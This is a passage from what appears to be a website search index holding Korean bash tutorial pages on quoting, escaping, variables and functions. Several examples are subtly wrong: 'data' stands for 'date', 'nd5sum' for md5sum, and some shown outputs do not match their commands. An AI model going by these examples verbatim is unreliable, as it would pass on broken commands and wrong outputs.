하나의 인수가 됩니다.) # 옳은 설정 : [ 10 -eq 10 ]; echo $? $ [ a=b ]; echo $? # 위의 경우는 인수들 사이에 공백을 두지 않아 a=b가 하나의 인수로 인식됩니다. # 옳은 설정 : [ a = b ]; echo $?    대입연산    Shell 에서는 위에서 살펴본 기본 명령 구조를 갖지 않는 문장이 존재합니다.\n  이는 대입연산으로 대입연산을 하는 문장의 명령을 작성하는 식으로 작성하면 오류가 발생합니다.\n  $ AA = 10 # 변수 AA가 명령이 되고 = , 10는 각각 인수로 인식됩니다. # 옮은 설정 : AA=10;  Shell Script를 작성할 때는 대입연산을 제외하고 모두 공백을 두어 작성하는 것도 오류를 줄일 수 있는 방법이 될 수 있습니다.     참과 거짓    if 문에서 참, 거짓을 판단할 때 프로그래밍 언어에서는 0=거짓이고 그 외의 값은 참이지만 Shell 에서는 반대입니다. 0=정상종료(참)를 나타내고, 그 외 숫자는 오류를 분류하여 나타내는데 사용되므로 거짓이 됩니다.\n  또한 판단에 사용되는 값도 명령의 종료 상태 값( $? )으로만 사용합니다.\n  즉 $?는 명령의 종료 상태 값을 나타내는 Shell에서 제공하는 특수변수입니다.\n  $ data -@ $ echo $? # 에러가 발생했으므로 1이 출력 $ data +%Y $ echo $? # 정상종료되었으므로 0이 출력 $ func() { return $1 ;} # 전달받은 인수값을 그대로 리턴하는 함수. $1은 첫번째 인수를 의미 $ if func 0; then echo true; else echo false; fi true $ if func 1; then echo true; else echo false; fi false # 0은 종료 상태 값으로 0을 리턴하므로 참이며, 1은 종료 상태 값으로 1을 리턴하므로 거짓    return    Shell 함수에서 사용되는 return 명령은 프로그래밍 언어와 달리 연산 결과를 반환하는 데 사용되지 않습니다.\n  Shell Script를 종료할 때 exit 명령을 이용해 종료 상태 값을 지정하는 것처럼 함수에서는 return 명령을 사용해 종료 상태 값을 지정합니다.\n  $ func() { expr $1 + $2 ; return 5 ;} $ func 1 2 3 $ echo $? 5 $ AA=$( func 1 2 ) $ echo $AA # func 함수의 stdout 출력 값이 연산 결과 값이 된다.    명령 종료 문자    C/ C++ 언어에서는 문장의 종료를 나타내기 위해 마지막에 항상 ;를 붙여야 하지만 Shell Script 에서는 반드시 문장 끝에 붙일 필요는 없습니다.\n  그 이유는 라인개행을 알아서 인식하기 때문으로 개행을 하지 않고 명령들을 한 줄에 연이어 쓸 경우는 반드시 ;를 붙여야 합니다.\n  특히 grouping 을 위해 중괄호 { } 사용 시에는 명령의 인수와의 구분을 위해 반드시 마지막에 ;를 붙여야합니다.\n  $ for i in {1..3} \u0026gt; do \u0026gt; echo $i \u0026gt; done 1 2 3 $ for i in {1..3} do echo $i done # 오류가 발생합니다. $ for i in {1..3}; do echo $i; done 1 2 3 # 정상적으로 출력됩니다. $ { echo 1 } ;} 1 } $ { echo 1; echo 2 } # 오류 $ { echo 1; echo 2 ;} 1    Shell 메타문자    Shell 메타문자는 Shell에서 특별히 취급되는 문자입니다.\n  따라서 공백이나 ;제약 없이 프로그래밍 언어에서처럼 자유롭게 사용될 수 있습니다.\n  그 중에 소괄호 ()는 subshell을 만들 때 사용되는 메타문자입니다.\n  $ (echo hello; echo world) hello world    Escape    Shell에서 사용되는 명령문에는 단지 명령문을 위한 스트링만 존재하지 않습니다.\n  script 작성을 위해 Shell에서 제공하는 키워드, 메타문자, glob 문자들이같이 사용되는 환경이기 때문에 만약에 명령문에서 동일한 문자가 사용된다면 escape 하거나 quota 하여 명령문을 위한 스트링으로 만들어 줘야 오류가 발생하지 않습니다.\n  $ expr 3 * 4 # 명령문에 shell 에서 사용하는 glob 문자 `*`가 포함되어 에러가 발생 $ expr 3 \\* 4 $ expr \u0026#34;*\u0026#34; 4 12 # 상단과 같이 excape 하거나 quote 하여 명령문을 위한 스트링으로 생성 $ [ a \\\u0026lt; b ] $ test a \\\u0026gt; b $ expr 3 \\\u0026gt; 4 # \u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39; 문자는 shell에서 사용되는 redirection 메타문자로 마찬가지로 excape 하거나 quote가 필요하다. $ find * \\( -name \u0026#34;*.log\u0026#34; -or -name \u0026#34;*.bak\u0026#34; \\) -exec rm -f {} \\; # \u0026#39;( )\u0026#39; \u0026#39;;\u0026#39; 문자도 shell 에서 사용하는 메타문자이다.    단어분리    단어분리는 Shell이 가지고 있는 고유의 기능 중 하나로, 변수나 명령치환을 quote 하지 않으면 값이 출력될 때 IFS ( Internal Field Separator )에 의 단어가 분리됩니다.\n  이에 따라 뜻하지 않게 인수가 2개 이상으로 늘어난다거나, 공백이 포함된 파일이름이 분리가 되는 오류가 발생할 수 있습니다.\n  $ mkdir \u0026#34;Shell Sciprt\u0026#34; $ dir=\u0026#34;Shell Sciprt\u0026#34; $ cd $dir # $dir 변수를 quote 하지 않아 단어분리가 일어나 `Shell`만이 디렉터리 명이 됩니다. $ cd \u0026#34;$dir\u0026#34; # $dir 변수를 quote하여 \u0026#39;Shell Sciprt\u0026#39;가 디렉터리 명이 됩니다. $ AA=\u0026#34;Hello World\u0026#34; $ func() { echo arg1 : \u0026#34;$1\u0026#34; echo arg2 : \u0026#34;$2\u0026#34; } $ func \u0026#34;$AA\u0026#34; arg1 : Hello World arg2 : # $AA 변수가 quote하여 \u0026#39;Hello World\u0026#39;가 함수로 전달됩니다. $ func $AA arg1 : Hello arg2 : World # $AA 변수가 quote 되지 않아 Hello, World가 따로 함수로 전달됩니다.    Filename Expansion (Globbing)    Shell 에서는 파일을 Select 할 때 glob 문자( *, ?, [ ])를 사용합니다.\n  그러므로 변수나 명령치환을 quote 하지않고 사용할 경우 출력되는 값에 glob 문자가 포함되면 뜻하지 않게 globbing이 발생해 오류가 발생할 수 있습니다.\n  $ AA=\u0026#34;User-Agent: *\u0026#34; # 변수 AA 값으로 glob 문자 \u0026#39;*\u0026#39;이 사용됨 $ echo \u0026#34;$AA\u0026#34; User-Agent: * # quote을 사용하면 globbing이 발생하지 않음    명령옵션   명령옵션은 보통 - 문자로 시작하며 -로 시작하고 하나의 문자를 사용하는 short form과 --로 시작하고 여러 개의 문자를 사용해는 long form 두 종류가 사용됩니다.     Short form Long form     -h -help   -o value \u0026ndash;option=value   -axjf(합쳐서 사용가능) X   사용하기 간편 이름을 통해 옵션의 의미 인지가능     하지만 이 옵션으로 인해 스크립트를 실행할 때 오류가 발생할 수 있습니다.  $ grep -r \u0026#39;-n\u0026#39; # `-n`을 grep 명령의 옵션으로 인식해 정상적으로 실행되지 않는다. $ grep -r \u0026#34;--hello\u0026#34; # \u0026#39;--hello\u0026#39; 를 grep 명령의 옵션으로 인식해 정상적으로 실행되지 않는다. $ grep -r -- \u0026#39;n\u0026#39; $ grep -r -- \u0026#34;--hello\u0026#34; # `--`를 입력하여 이를 해결할 수 있음 # `--`는 end of options을 의미 command -o val -- \u0026#34;$arg1\u0026#34; \u0026#34;$arg2\u0026#34; # 즉 Script를 작성시에는 상단과 같이 `--`를 통해 분리해야 오류를 줄일 수 있음    STDIO    명령들을 사용하다 보면 종종 -문자가 input, output에 사용되는 경우가 있습니다.\n  이 때는 입력에 사용되면 stdin과 같은 역할을 하며 출력시에는 stout과 같은 역할을 수행합니다.\n  $ echo hello world | cat - hello world $ cat test.txt 111 222 333 $ echo hello world | cat test.txt 111 222 333 $ echo hello world | - cat test.txt hello world 111 222 333 $ echo hello world | cat test.txt - 111 222 333 hello world    Shell에서 $문자를 이용하는 확장방법    Shell에서는 $ 문자를 이용하는 3 가지 종류가 있습니다.\n  ${ }를 사용하는 매개변수 확장 ($AA, ${AA}, ${AA:-5}, ${AA%.*}\u0026hellip;\n  $(( ))를 사용하는 산술확장 ($(( 1 + 2 )))\n  $( )를 사용하는 명령 치환: $( echo \u0026ldquo;1.3 + 2.5\u0026rdquo; | bc )\u0026hellip;\n       주석    Shell에서 주석은 # 문자를 사용합니다. 하지만 명령문에서도 # 문자가 사용될 수 있으므로 무조건 # 이후로 처리되는 것은 아니고 # 문자 앞에 공백이 있어야 주석으로 처리됩니다.\n  그러므로 처음 두 라인은 # 이후로 주석으로 처리되지만 마지막 라인은 주석으로 처리되지 않습니다.\n  $ echo \\#1234 | sed s/#/@/ @1234 $ echo \u0026#34;#1234\u0026#34; | sed s/#/@/ @1234 "}),a.add({id:259,href:'/docs/development/shell/shell02/',title:"Quotes",content:"Shell Programming    Quotes    Shell 중요한 핵심 개념 중 하나는 quotes라 할 수 있습니다.\n  shell에서 quotes는 숫자나 스트링 값을 구분하기 위한 용도로는 사용하지 않습니다.\n  1234, \u0026ldquo;123\u0026rdquo;, \u0026lsquo;123\u0026rsquo;은 모두 동일하며, abc, \u0026ldquo;abc\u0026rdquo;, \u0026lsquo;abc\u0026rsquo; 또한 차이가 없고 모두 스트링 문자열입니다.\n  Shell 에서 quotes는 다음과 같은 용도로 사용됩니다.\n  공백으로 분리되어 여러 개의 스트링을 하나의 인수로 만들 때(sed, awk 스크립트를 quotes을 이용해 작성하는 이유가 하나의 인수로 만들기 위해서입니다.\n  라인 개행이나 둘 이상의 공백을 유지하기 위해\n  단어분리, globbing을 방자하기 위해\n  Shell 키워드, 메타문자, alias 와 같이 Shell 에서 특수기느을 하는 문자, 단어를 단순히 명령문의 스트링으로 만들하기 위해\n  문자 그대로 스트링을 강조하기 위해\n    최종적으로 명령이 실행될 때는 사용된 quotes이 제거된 후에 인수가 전달됩니다.\n  # args.sh #!/bin/bash echo arg1 : \u0026#34;$1\u0026#34; echo arg2 : \u0026#34;$2\u0026#34; $ ./arg.sh 111 \u0026#34;111\u0026#34; arg1 : 111 arg2 : 111 $ ./arg.sh 111 222 arg1 : 111 arg2 : 222 $ ./arg.sh \u0026#34;111 222\u0026#34; arg1 : 111 222 arg2 : $ sed -n 1p; 2p; 3p file ERROR $ sed -n \u0026#34;1p; 2p; 3p\u0026#34; file OK #!/bin/bash ls -al ls \u0026#34;-al\u0026#34; \u0026#34;ls\u0026#34; \u0026#39;-al\u0026#39; # 상단의 명령어들의 출력결과는 모두 동이하며 명령문에서는 사용된 quotes는 shell에 의해 해석된 후에 자동으로 제거됩니다.    특수 기능을 갖는 문자들   하단의 세 문자는 Shell 메타문자로 명령행 상에서 특수한 기능을 가지고 있습니다.     문자 기능     $ 매개변수 확장, 산술 확장, 명령 치환에 사용   ` 명령 치환에 사용 (backtick)   ! history (프롬프트상에서만)    $ AA=hello $ echo $AA world `data +%Y` hello world 2020 # $AA 변수가 확장이 되고 data가 명령치환됩니다. $ echo \\$AA world \\`data +%Y\\` $AA world `data +%Y`    특수기능을 갖는 문자나 단어를 escape 하는 방법   Shell에서는 escape 할때 \\ 문자 외에 quote를 사용할 수 있습니다. quote을 하면 특수기능이 없어지고 단순히 명령문을 위한 스트링으로 사용됩니다.  $ find * -type f \u0026#39;(\u0026#39; -name \u0026#34;*.log\u0026#34; -or -name \u0026#34;*.bak\u0026#34; \u0026#39;)\u0026#39; -exec rm -rf {} \u0026#39;;\u0026#39; # ( ) ; shell 메타문자를 quote하여 기능을 상실, find 명령을 위한 스트링이 됩니다. # \\( \\) \\;와 동일합니다. $ echo hello \u0026#39;\u0026amp;\u0026#39; hello \u0026amp; # background 프로세스를 생성할 때 사용하는 \u0026amp; 메타문자를 quote 하여 기능을 상실 $ echo hello world | tr \u0026#39; \u0026#39; \u0026#39;\\\u0026#39; n hello world # escape 문자인 \\를 quote 하여 기능을 상실, 결과적으로 \\n이 됩니다. # \\\\n 한것과 동일합니다. $ \u0026#39;grep\u0026#39; 2015-07 data.txt # grep 명령에 설정되어 있는 alias가 escape 됩니다.    No quotes    No quotes 상태에서는 기본적으로 모든 문자가 escape 됩니다.\n  따라서 shell 키워드, 메타문자, alias, glob 문자, quotes, whitespace 문자를 escape 하여 해당 기능을 disable 할 수 있습니다.\n  whitespace 문자는 space, tab, newline을 의미합니다.\n  $ echo \\a\\b\\c\\d\\ \\!\\@\\$\\%\\^\\\u0026amp;\\*\\(\\)\\{\\}\\[\\]\\\u0026lt;\\\u0026gt;\\/\\\\ abcd !@$%^\u0026amp;.... $ echo \u0026#34;\\a\\b\\c\\d\u0026#34; \\a\\b\\c\\d $ echo \u0026#39;\\a\\b\\c\\d\u0026#39; \\a\\b\\c\\d    명령행 상에서 공백은 인수를 구분하는 데도 사용됩니다.\n  둘 이상의 공백은 의미가 없으므로 하나의 공백으로 대체되며, no quotes 에서는 공백도 escape 할 수 있습니다.\n  공백은 escape하면 두 개의 인수가 하나가 됩니다.\n  # args.sh #!/bin/bash echo arg1 : \u0026#34;$1\u0026#34; echo arg2 : \u0026#34;$2\u0026#34; $ ./args.sh hello world arg1 : hello arg2 : world $ ./args.sh hello\\ world arg1 : hello world arg2 : $ echo hello world hello world $ echo hello \\ \\ \\ \\ \\ \\ \\ world hello world $ echo -e foo\\tbar\\n123 footbarn123 $ echo -e foo\\\\tbar\\\\n123 foo bar 123 # 모든 문자가 escape 되므로 t b 이 echo 명령에 전달된다. # \\\\t, \\\\n으로 \\t, \\n의 입출력이 가능하다. $ date Sat Jul 18 00:06:41 EST 2020 $ echo hello !! echo hello date hello date $ echo hello \\!! hello !! # !를 사용해 history 확장기능을 사용할 수 있다 $ echo 111:222:333 | tr : \\n 111n222n333 $ echo 111:222:333 | tr : \\\\n 111 222 333 # tr : \\\\n을 사용하면 tr : \u0026#39;\\n\u0026#39;과 같은 결과가 출력된다. $ echo double quotes \\\u0026#34; , single quotes \\\u0026#39; double quotes \u0026#34;, single quotes \u0026#39; # \u0026#34;, \u0026#39; 문자또한 \\를 사용해 사용할 수 있다 $ echo \u0026#34;I like \\ \u0026gt; winter and \\ \u0026gt; snow\u0026#34; I like winter and snow # 행의 마지막에 \\를 붙이고 개행을 하면 \\newline과 같이 되어 newline을 escape한 결과를 갖는다. # 이것을 backslash-newline이라 하며, \\뒤에 다른 문자가 오면 안된다.    Double quotes(\u0026quot; \u0026ldquo;)    Double quotes 안에서는 $ ```! 특수기능을 하는 문자들이 해석되어 실행되고 공백과 개행이 유지됩니다.\n  변수 사용 시에도 동일하게 적용되므로 quote를 하지 않으면 공백과 개형이 유지되지 않습니다.\n  $ echo \u0026#34;I \u0026gt; like \u0026gt; winter and snow\u0026#34; I like winter and snow # 공백과 개행이 유지된다. $ AA=\u0026#34;thie is two lines\u0026#34; $ echo $AA thie is tow lines $ echo \u0026#34;$AA\u0026#34; this is two lines # whitespace 문자들이 single space로 변경되고 공백과 개행이 유지되지 않는다. # quote를 하여 공백과 개행이 유지돤다.    Double quotes에서 escape 되는 문자들     \u0026quot; $ `` \\ newline는 double quotes에서 위의 문자들이 특수한 기능을 가지고 사용되기 때문에 \\ 문자로 escape 할 수가 있습니다.\n  single quotes와 비교해 보면 하단과 같다.\n  $ echo \u0026#39;\\$ \\` \\\\\u0026#39; \\$ \\` \\\\ # single quotes $ echo \u0026#34;$\\` \\\\\u0026#34; $ ` \\ # double quotes $ echo \u0026#39;quotes\\ test\u0026#39; quotes\\ test # single quotes는 문자 그대로 표시된다. $ echo \u0026#34;quotes\\ test\u0026#34; quoteststest # double quotes 에서는 newline이 escape되어 한줄로 표시된다.  double quotes를 사용할 때 한 가지 주의해야될 사항은 ! 문자를 이용한 command history 확장이 doduble quotes에서도 일어난다는 것으로, command history 기능이 사용되는 프로픔프트 상에서만 적용되는 것으로 함수나 스크립트 파일 실행시는 해당되지 않습니다.     Array와 관련된 특수기능   double quotes는 array와 관련해서 특수한 기능을 가지고 있는 데, 이는 전체 원소를 나타내는 ${arr[@]}를 quote하면 그 의미는 \u0026quot;${arr[0]}\u0026quot; \u0026quot;${arr[1]}\u0026quot; '${arr[2]}\u0026quot;...와 같게되며 ${arr[*]}를 quote하면 그 의미는 \u0026quot;${arr[0]}X${arr[1]}X${arr[2]}X...\u0026quot;와 같게 된다. 여기서 X의 의미는 IFS 값의 첫 번째 문자를 의미한다. $@, $* positional parameters 에서도 동일하게 적용된다.     null 변수값의 quote  $ AA=\u0026#34;\u0026#34; # args.sh #!/bin/bash \\$0 : ~ \\$1 : \u0026#34;$1\u0026#34; \\$2 : \u0026#34;$2\u0026#34; \\$3 : \u0026#34;$3\u0026#34; \\$4 : \u0026#34;$4\u0026#34; $ ./args.sh 1 2 3 4 /root 1 2 3 4 \\$0 : ~ \\$1 : \u0026#34;$1\u0026#34; \\$2 : \u0026#34;$2\u0026#34; \\$3 : \u0026#34;$AA\u0026#34; \\$4 : \u0026#34;$4\u0026#34; /root 1 2 4 # null 값 인수   가령 위와 같은 스크립트에서 $comp 변수의 값이 -c일 경우는 tmpfile이 컴파일된 오브젝트 파일이 되고 $comp 변수 값이 null일 경우는 링크가 완료된 실행파일을 만들고자 한다면 $comp 변수를 quote하는 것이 불가능하다.\n  quote에 의해 null 값이 하나의 인수로 전달되어 두 번째와 같이 오류가 발생하기 때문이다.\n  즉, 변수를 quote 하는 것은 오류 메시지 출력에도 영향을 끼칠 수 있으며, 변수를 quote 하면 좀 더 명확한 오류메시지가 출력된다. 따라서 명령문을 작성할 때는 변수를 quote 해서 사용하는 것이 보다 유리하다.\n  $ AA=\u0026#34;\u0026#34; $ echo hello 2\u0026gt;\u0026amp; $AA $ echo hello 2\u0026gt;$ \u0026#34;$AA\u0026#34; # quote를 하면 좀 더 명확한 오류메시지가 출력된다. $ echo hello \u0026gt; $AA bash: $AA: ambiguous redirect $ echo hello \u0026gt; \u0026#34;$AA\u0026#34; bash: No such file or directory    Single quotes(\u0026rsquo; \u0026lsquo;)    Single quotes(\u0026rsquo; \u0026lsquo;)는 별 다른 기능 없이 모든 문자를 그대로 표시하는 역할을 수행한다.\n  escape도 수행되지 않으며 escape를 수행하기 위해서는 $' '을 사용해야한다.\n  $ AA=hello $ echo \u0026#39;$AA world \u0026gt;`date` \u0026gt;\\$AA \u0026gt;\u0026#39; $AA world `date` \\$AA # \u0026#39;\u0026#39;사이에는 모든 문자를 그대로 표현한다. $ echo \u0026#39;foo\u0026#39;\\\u0026#39;\u0026#39;bar\u0026#39; foo\u0026#39;bar $ echo \u0026#39;foo\u0026#39;\u0026#34;\u0026#39;\u0026#34;\u0026#39;bar\u0026#39; foo\u0026#39;bar # Single quotes의 사용이 필요한 경우는 `double quotes \u0026#34;\u0026#34;` 혹은 `\\`를 사용한다. $AA=100; $sh -c \u0026#34;AA=200; echo $AA\u0026#34; 100 # double quotes $sh -c \u0026#34;AA=200; echo $AA\u0026#34; 200 # single quotes    $\u0026rsquo; \u0026lsquo;    $' '는 ' '와 동이하지만 escape 문자를 사용할 수 있다.\n  escape 문자가 처리되고 난 결과를 $가 제외된 ' ' 상태가 된다.\n  sh에서는 사용할 수 없다.\n  $ echo $\u0026#39;I like\\n \\\u0026#39;winter\\\u0026#39; \\tand\\t\\\u0026#39;snow\u0026#39; I like \u0026#39;winter\u0026#39; and \u0026#39;snow\u0026#39; # \\n, \\t \\\u0026#39; escape 문자가 사용    Quotesㄹ르 서로 붙여 사용하기    두 개의 quotes를 공백을 두지 않고 서로 붙이면 하나가 된다.\n  이 원리는 변수를 포함하는 명령 스트링을 만들거나 함수에 전달할 인수를 하나로 만들 때 유용하게 사용할 수 있다.\n  명령 스트링을 만들 때는 ' '을 사용해 명령문을 작성하였는 데, 그 안에 Shell 변수를 사용할 일이 생기면 하단과 같이 ' '을 분리한 후 double quotes 한 변수를 공백 없이 붙여 사용하면 된다.\n  $ sed -E \u0026#39;s/foo/bar/g\u0026#39; $ sed -E \u0026#39;s/\u0026#39;\u0026#34;$var1/$var2\u0026#34;\u0026#39;/g\u0026#39;    awk는 스크립트 내에서 $ 문자를 사용하기 때문에 기본적으로 single quotes을 이용해 작성한다.\n  하단의 경우를 보면 -exec 옵션에 sh -c 명령이 single quotes에 의해 작성되고 있는 데, 그 안에 있는 awk 명령에서도 single quotes이 사용되어지고 있으며, 이와 같은 경우 다음과 같이 일단 quotes을 분리한 후 \\'나 \u0026quot;'\u0026quot;를 사용해 연결하면 sh -c '...' 내에서 실행되는 awk 명령에서도 single quotes를 사용할 수 있다.\n  $ find * -name \u0026#39;Packages*\u0026#39; -type f -exec \\ sh -c \u0026#39;echo $(nd5sum \u0026#34;{}\u0026#34; | awk \u0026#39;\\\u0026#39;\u0026#39;{print $1\u0026#39;\\\u0026#39;\u0026#39;}) $(stat -c %s \u0026#34;{}\u0026#34;) \u0026#34;{}\u0026#34;\u0026#39; \\; $ ./args.sh 11 \u0026#34;hello \u0026#34;$\u0026#39;$world \\u2665\u0026#39; 33 $0 : /root $1 : 11 $2 : hello $world ♥ $3 : 33 $4 :    Escape Sequences     Escape Sequence Character represented 적용     \\ backslash *   \\a alert (bell) *   \\b backspace *   \\e escape (ASCII 033) *   \\f form feed *   \\n newline *   \\r carriage return *   \\t horizontal tab *   \\v vertical tab *   ' single quotes printf $ ' '   \u0026quot; double quotes *   ? question mark printf $ ' '   \u0026lt;NNN\u0026gt; 8비트 문자로 N은 8진수 값을 의미(1~3개) printf $\u0026rsquo; '   \\0 8비트 문자로 N은 8진수 값을 의미(1~3개) echo   \\x 8비트 문자로 H은 16진수 값을 의미(1~2개) *   \\u 유니토드 문자로 H은 16진수 값을 의미(1~4개) *   \\u\u0026lt;HHHHㅗㅗㅗㅗ\u0026gt; 유니토드 문자로 H은 16진수 값을 의미(1~8개) *   \\c 이후의 스트링은 출력에서 제외 *   \\cx ctrl-x 문자, 가령 $'\\cz\u0026rsquo;는 Ctrl-z(^Z) $' '    "}),a.add({id:260,href:'/docs/development/shell/shell03/',title:"Variables",content:"Shell Programming    Variables    변수 이름은 알파벳 (대, 소문자, 숫자, _)로 만들 수 있으며 이름의 첫 문자로 숫자가 올 수는 없다.\n  변수이름을 대문자로 사용할 때는 Shell 환경변수와 증복되지 않도록 주의해야 하며, 생성한 변수는 subshell이나 source한 스크립트 내에서 별다른 설정 없이 사용할 수 있으나 child process에서도 사용하려면 export를 수행해야 한다.\n  Myfile=Myfile FIRE_PREFIX=$Myfile.split FIRE_PREFIX=$Myfile_._split # \u0026#39;.\u0026#39; or \u0026#39;_\u0026#39;은 변수 이름을 구성하는 데 사용되지 않으므로 위와 같이 사용이 가능 # 결과적으로 FILE_PREFIX 변수 값은 \u0026#39;myfile.split\u0026#39; or \u0026#39;myfile-split\u0026#39;가 됨 $ compgen -A variable # 현재 shell에 정의된 모든 변수명을 출력 $ unset -v 변수명 $ unset 변수명 # unset 명령 실행시 옵션을 주지 않으면 첫번째 변수를 unset 시도하고, 실패할 경우 함수를 unset 한다. $ export 변수명 $ declare -x 변수명 # 변수명을 등록(export)한다 $ export -n 변수명 # 변수명을 취소한다 $ declare -p LANG # 출력 값에 \u0026#39;x\u0026#39;가 있으면 export된 변수를 의미 $ declare -p AA # 출력 값에 \u0026#39;x\u0026#39;가 있으면 export된 변수를 의미 $ export -p # 현재 export된 모든 변술르 출력 $ alias grep=\u0026#39;grep --color=auto\u0026#39; $ grep=$(echo hello) # 외부 명령, 함수, alias와 동일한 이름의 변수를 사용할 수 있다. $ echo $grep hello    Variable states    Shell에서는 변수의 상태를 3가지로 구분할 수 있다.\n  변수가 존재하지 않는 상태 또는 unset상태\n 변수가 존재하지 않느 상태란 변수에 값을(Null 포함) 한번도 대입한 적이 없는 상태를 의미하며, 그러므로 값을 할당하지 않고 declare AA or local AA와 같이 선언만 한 경우도 이에 해당, 이미 사용했던 변수도 uset 명령을 사용하면 이 상태가 된다.       null 값인 상태\n 하단과 같이 변수가 존재하고 null 값을 가지고 있는 상태    AA= AA=\u0026#34;\u0026#34; AA=\u0026#39;\u0026#39;    null 이외의 값을 가지고 있는 상태\n 하단과 같은 경우 변수가 존재하고 무엇이든 값을 가지고 있는 상태    AA=\u0026#34; \u0026#34; AA=\u0026#34;Hello\u0026#34; AA=\u0026#39;123\u0026#39;    값을 구분하기   무엇이든 값을 가지고 있는 상태와 그렇지 않은 상태(1,2번)은 다음과 같이 구분할 수 있습니다.  if [ -z \u0026#34;$var\u0026#34; ]; then ... # $var 1, 2번 상태일 때 참 if [ -n \u0026#34;$var\u0026#34; ]; then ... # $var가 3번 상태일 때 참 $ [ -v asdfgh ]; echo $? 1 $ asdfgh=\u0026#34;\u0026#34; $ [ -v asdfgh ]; echo $? 0 $ unset asdfgh $ [ -v asdfgh ]; echo $? 1  sh 에서는 -v 옵션을 사용할 수 없다. 하지만 매개변수 확장 기능을 활용하면 쉽게 체크할 수 있다. 또는 set -u(nounsset) 옵션을 활용하여 테스트 할 수도 있으며, 이 옵션을 설정하면 1번 존재하지 않는 변수 사용시 오류를 반환하고 스크립트가 종료된다.     subshell과 스크립트 파일   subshell과 스크립트 파일에서는 현재 shell의 변수 값을 변경할 수 없다.  $ AA=100 $ echo $AA 100 $ echo 111 | export AA=200 $ echo $AA 100 $ (export AA=200) $ echo $AA 100 # 변경되지 않는다. # test.sh #!/bin/bash export AA=200 $ ./test.sh $ echo $AA 100 # 스크립트 파일도 별도의 프로세스에서 실행되므로 현재 Shell의 변수 값을 변경할 수 없습니다.    Bash에서의 전용   변수 이름을 indirection을 사용할 수 있다.  $ hello=100 $ linux=hello $ echo ${$linux} error $ echo ${!linux} 100 # !linux --\u0026gt; linux --\u0026gt; hello $ arr=( 11 22 33 44 ) $ AA=arr[2] $ echo \u0026#34;${!AA}\u0026#34; 33 # !AA --\u0026gt; $AA --\u0026gt; arr[2] # bash.sh #!/bin/bash func() { echo \u0026#34;$1\u0026#34; for v in \u0026#34;${!2}\u0026#34;; do # !2 --\u0026gt; $2 --\u0026gt; AA[@] echo \u0026#34;$v\u0026#34; done echo \u0026#34;$3\u0026#34; } AA=(22 \u0026#34;33 44\u0026#34; 55) func 11 \u0026#39;AA[@]\u0026#39; 66 11 22 33 44 55 66 # named.sh #!/bin/bash f2() { declare RVAR=$1 RVAR=200 # declare는 함수 내에서 사용되면 local과 같다. } f1() { local VAR=100 echo f1 : local VAR = $VAR f2 VAR echo f1 : local VAR after f2 call = $VAR } f1 # change.sh #!/bin/bash func() { local ARR=100 AA[1]=$ARR } AA=(11 22 33 44) func AA for v in \u0026#34;${AA[@]}\u0026#34;; do echo \u0026#34;$v\u0026#34; done "}),a.add({id:261,href:'/docs/development/shell/shell04/',title:"Fucnctions",content:"Shell Programming    Functions    {;}, ()를 이용해 명령 그룹을 만들게 되면 같은 context에서 실행이 된다. 이것은 명령 그룹전체가 하나의 명령처럼 실행되는 것과 같은 효과가 있다.\n  앞에 함수명을 붙여서 함수정의를 하게 되면 일반 명령과 동일하게 사용될 수 있다.\n  {;}은 현재 shell에서 ()는 subshell에서 실행되므로 보통 함수를 정의할 때 {;}을 사용하지만 필요하다면 ()을 사용할 수도 있다.\n  $ echo hello world | read var; echo \u0026#34;$var\u0026#34; # 파이프로 인해 subshell에서 실행되어 \u0026#34;$var\u0026#34;는 값이 표시되지 않는다. $ echo hello world | { read var; echo \u0026#34;$var\u0026#34;; } # {}을 이용해 명령 그룹을 생성하면 read, echo 명령이 같은 context에서 실행되어 정상적으로 값이 표시된다. $ echo hello; echo world \u0026gt; outfile # hello는 터미널에 표시되고 world만 outfile에 저장된다. $ { echo hello; echo world; } \u0026gt; outfile # hello world가 모두 outfile에 저장된다. $ time sleep 2 \u0026amp;\u0026amp; sleep 3 # 첫번째 명령만 시각 측정된다. $ time { sleep 2 \u0026amp;\u0026amp; sleep 3; } # {}안에 있는 명령이 모두 측정된다.    함수를 정의하는 방법    Shell은 함수를 정의할 때 프로그래밍 언어에서처럼 매개변수를 작성하지 않으며, 전달된 인수 값은 함수 내에서 $1 $2 $3... 특수 변수에 자동으로 할당된다.\n  함수명에는 Shell에서 사용되는 메타문자나 quotes 등은 사용할 수 없으며, 또한 외부 명령이나 alias 와 동일한 이름을 사용할 경우 syntax error가 발생하는 데 이때는 앞에 function 키워드를 작성해야한다.\n  # 기본적으로 function 키워드는 bash에서만 사용할 수 있으며 sh에서는 사용이 불가능하다. $ 함수명 ( p1 p2 p3 ) { ... ;} $ 함수명 () { ... ;} $ function 함수명 () { ... ;} # bash에서만 사용이 가능 $ func() for arg; do echo \u0026#34;$arg\u0026#34; done $ func 111 222 333 111 222 333 $ declare -f 함수명 # 정의된 함수 내용 출력 $ declare -F $ compgen -A function # 현재 Shell에 정의된 모든 함수명 출력 $ declare -F _dock $ echo $? 1 $ declare -F func func $ echo $? 0 # _dock 이라는 함수는 정의되어 있지 않기 때문에 1, _docker는 정의되어 있기에 0을 출력 $ unset -f 함수명 # 정의되어져 있는 함수를 삭제    함수 실행시 필수적인 사전정의   함수를 실행시에는 반드시 사전정의가 되어있어야 하며, 그렇지 않을 경우 에러가 발생된다.  $ foo1 # foo1이라는 함수는 정의되어 있지 않기 때문에 출력이 불가능 $ foo1() { echo \u0026#34;foo1\u0026#34; foo2 } foo2() { echo \u0026#34;foo2\u0026#34; } $ foo1 foo1 foo2 # 함수를 정의하면 실행이 가능하다.    조건에 따라 다른 함수를 정의할 수 있다.             변수의 기본값 : global scope   global scope 라는 것은 현재 스크립트 파일을 의미  # Global.sh #!/bin/bash BB=200 foo() { AA=100 } foo echo $AA echo $BB $ Global.sh 100 200    지역변수 설정 :local    local과 declare은 동일한 기능을 하지만 local은 global scope에서 사용할 수는 없다.\n  declare가 함수 내에서 사용되면 local과 동일한 역할을 수행\n  # sh 에서는 함수 내에서 local만 사용할 수 있다. #!/bin/bash foo() { local AA=100 BB=200 } foo echo AA : $AA echo BB : $BB $ Local.sh AA : BB : 200 # loacl로 선언된 AA는 함수 내부에만 사용 될 수 있다. # Ps_list.sh #!/bin/bash list_descendants(){ local childre=$( cat /proc/$1/task/*/children 2\u0026gt; /dev/null ) # 또는 local children=$( ps -o pid= --ppid $1 ) for pid in $children do list_descendants $pid done echo $children }    dynamic scoping   Shell 함수에서는 local로 설정한 변수를 child 함수에서 읽고 쓸 수 있으며, 변경한 값도 